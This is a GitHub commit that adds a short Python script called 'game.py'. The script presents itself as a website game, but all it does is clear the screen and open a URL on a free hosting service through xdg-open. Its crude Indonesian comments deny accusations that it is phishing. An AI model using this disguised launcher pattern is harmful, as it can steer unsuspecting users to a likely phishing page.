137989507fff91bb315d09b0a09972d27d59ae1d
D4RKSH4D0WS <49472584+D4RKSH4D0WS@users.noreply.github.com>
2020-04-13 10:54:18 +0700

    Create game.py

---
+++ game.py
@@ -0,0 +1,9 @@
+#GOBLOK KALEAN YG BILANG PHISING
+#PHISING PELER KAU
+import os
+os.system('clear')
+print '''
+Game Basis Website
+Enjoy
+'''
+os.system('xdg-open http://imamwae.000webhostapp.com/Game_DRA')
